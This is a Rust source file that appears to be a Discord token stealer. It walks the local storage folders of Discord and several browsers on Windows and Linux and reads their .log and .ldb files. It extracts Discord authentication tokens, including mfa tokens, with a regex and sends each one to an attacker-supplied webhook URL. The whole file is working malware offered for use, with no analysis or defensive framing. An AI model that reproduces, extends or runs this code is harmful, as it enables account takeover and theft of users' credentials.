extern crate dirs;

mod utils;

use regex::Regex;
use std::env;
use utils::{fs::*, webhook::*};

#[cfg(target_os = "mac_os")] // Macdonald's users :)
fn paths() -> Vec<String> {
    vec![]
}

#[cfg(target_os = "linux")] // Linux
fn paths() -> Vec<String> {
    let config_path = dirs::config_dir().unwrap().display().to_string();

    let mut paths = vec![];

    paths.push(format!("{}/vivaldi/Default", config_path)); // Vivaldi

    paths
        .iter()
        .map(|path| format!("{}/Local Storage/leveldb", path))
        .collect()
}

#[cfg(target_os = "windows")]
fn paths() -> Vec<String> {
    let roaming = dirs::config_dir().unwrap().display().to_string();
    let local = dirs::cache_dir().unwrap().display().to_string();
    let mut paths = vec![];

    paths.push(format!("{}\\discord", roaming)); // Discord
    paths.push(format!("{}\\discordcanary", roaming)); // Discord Canary
    paths.push(format!("{}\\discordptb", roaming)); // Discord PTB
    paths.push(format!("{}\\Opera Software\\Opera Stable'", roaming)); // Opera
    paths.push(format!("{}\\Google\\Chrome\\User Data\\Default", local)); // Google Chrome
    paths.push(format!(
        "{}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        local
    )); // Brave
    paths.push(format!(
        "{}\\Yandex\\YandexBrowser\\User Data\\Default",
        local
    )); // Yandex
    paths.push(format!("{}\\Microsoft\\Edge\\User Data\\Default", local)); // Edge
    paths.push(format!("{}\\Vivaldi\\User Data\\Default", local)); // Vivaldi

    paths
        .iter()
        .map(|path| format!("{}\\Local Storage\\leveldb", path))
        .collect()
}

fn extract(data: &String) -> Option<String> {
    let regex = Regex::new(
        r#"([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84})"#,
    )
    .unwrap();
    
    let result = regex.captures(&data);

    if let Some(result) = result {
        let token = result.get(0).unwrap().as_str().to_string();
        return Some(token);
    }

    None
}

fn main() {
    dotenv::dotenv().ok();
    
    let webhook = Webhook::new(env::var("WEBHOOK_URL").unwrap());

    for path in paths() {
        for path in FS::dir(&path) {
            if !path.ends_with(".log") && !path.ends_with(".ldb") {
                continue;
            }

            let file = FS::read(&path);
            let token = extract(&file);

            if let Some(token) = token {
                webhook.send(token.as_str());
            }
        }
    }
}
